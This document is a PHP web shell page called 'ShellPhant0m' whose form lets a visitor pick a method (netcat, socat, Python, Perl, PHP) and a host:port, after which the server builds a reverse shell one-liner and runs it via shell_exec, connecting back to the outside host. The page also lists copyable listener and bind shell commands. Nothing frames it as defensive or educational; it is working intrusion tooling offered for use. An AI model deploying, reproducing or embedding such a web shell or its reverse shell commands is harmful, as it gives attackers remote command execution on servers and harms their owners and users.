<?php
function get_shell_command($method, $host, $port, $shell = '/bin/bash') {
    $commands = [
        'nc' => "rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|$shell -i 2>&1|nc $host $port >/tmp/f",
        'socat' => "socat exec:'$shell -li',pty,stderr,setsid,sigint,sane tcp:$host:$port",
        'python' => "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"$host\",$port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"$shell\")'",
        'perl' => "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($port,inet_aton(\"$host\")))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"$shell -i\");};'",
        'php' => "php -r '\$sock=fsockopen(\"$host\",$port);exec(\"$shell -i <&3 >&3 2>&3\");'"
    ];
    return isset($commands[$method]) ? $commands[$method] : "Invalid method";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    $method = filter_input(INPUT_POST, 'method', FILTER_SANITIZE_STRING);
    $target = filter_input(INPUT_POST, 'target', FILTER_SANITIZE_STRING);
    $shell = filter_input(INPUT_POST, 'shell', FILTER_SANITIZE_STRING) ?: '/bin/bash';

    if (preg_match('/^([a-zA-Z0-9\.\-]+):(\d{1,5})$/', $target, $m)) {
        $host = $m[1];
        $port = $m[2];
        $cmd = get_shell_command($method, $host, $port, $shell);
        shell_exec($cmd);
        echo json_encode(['success' => true, 'command' => $cmd]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Invalid target format']);
    }
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>ShellPhant0m</title>
    <style>
        body {
            background: #1e1e1e;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            padding: 2em;
            max-width: 1000px;
            margin: 0 auto;
        }
        .container {
            background: #2d2d2d;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,255,0,0.2);
        }
        select, input[type="text"], button {
            background: #333;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 8px;
            border-radius: 3px;
            margin: 5px 0;
        }
        .box {
            background: #333;
            padding: 15px;
            margin: 10px 0;
            border-radius: 3px;
            border-left: 3px solid #00ff00;
        }
        code {
            background: #1e1e1e;
            padding: 5px;
            display: block;
            margin: 5px 0;
        }
        .copy-btn {
            float: right;
            cursor: pointer;
        }
        #status {
            padding: 10px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Shell Phant0m</h1>
        <p>Version 2.0 by: andknownmaly</p>
        
        <form id="shellForm">
            <label>Method:
                <select name="method" id="method">
                    <option value="nc">Netcat (nc)</option>
                    <option value="socat">Socat</option>
                    <option value="python">Python</option>
                    <option value="perl">Perl</option>
                    <option value="php">PHP</option>
                </select>
            </label>
            <br>
            <label>Shell:
                <select name="shell" id="shell">
                    <option value="/bin/bash">/bin/bash</option>
                    <option value="/bin/sh">/bin/sh</option>
                    <option value="/sbin/sh">/sbin/sh</option>
                </select>
            </label>
            <br>
            <label>Target:
                <input type="text" name="target" id="target" placeholder="0.tcp.ap.ngrok.io:12345">
            </label>
            <br>
            <button type="submit">Launch Shell</button>
        </form>

        <div id="status"></div>
        
        <h2>Listener Commands</h2>
        <div class="box">
            <div>
                <strong>Port:</strong>
                <input type="number" id="portInput" value="4444" min="1" max="65535">
            </div>
        </div>

        <div id="listeners">
        </div>
    </div>

    <script>
        const listeners = {
            nc: 'nc -lvnp {port}',
            socat: 'socat file:`tty`,raw,echo=0 tcp-listen:{port}',
            python: 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"',
            perl: 'perl -e "use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in({port},INADDR_ANY));listen(S,1);accept(C,S);open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/bash -i\")"',
            php: 'php -r \'$sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($sock,"0.0.0.0",{port});socket_listen($sock,1);$client=socket_accept($sock);while(1){if(!socket_write($client,"$ ",2))exit;$cmd=socket_read($client,2048,PHP_NORMAL_READ);$output=shell_exec($cmd);socket_write($client,$output,strlen($output));}\''
        };

        function updateListeners() {
            const port = document.getElementById('portInput').value;
            const listenersDiv = document.getElementById('listeners');
            listenersDiv.innerHTML = '';
            
            Object.entries(listeners).forEach(([key, cmd]) => {
                const box = document.createElement('div');
                box.className = 'box';
                box.innerHTML = `
                    <strong>${key.toUpperCase()}:</strong>
                    <code id="${key}-cmd">${cmd.replace('{port}', port)}</code>
                    <button class="copy-btn" onclick="copyToClipboard('${key}-cmd')">Copy</button>
                `;
                listenersDiv.appendChild(box);
            });
        }

        document.getElementById('portInput').addEventListener('input', updateListeners);
        document.getElementById('shellForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            try {
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                const status = document.getElementById('status');
                status.style.display = 'block';
                status.style.background = result.success ? '#003300' : '#330000';
                status.textContent = result.success ? 
                    `Shell launched successfully! Command: ${result.command}` : 
                    `Error: ${result.error}`;
            } catch (error) {
                console.error('Error:', error);
            }
        });

        function copyToClipboard(id) {
            const cmd = document.getElementById(id).textContent;
            navigator.clipboard.writeText(cmd).then(() => {
                alert('Command copied to clipboard!');
            });
        }
        updateListeners();
    </script>
</body>
</html>
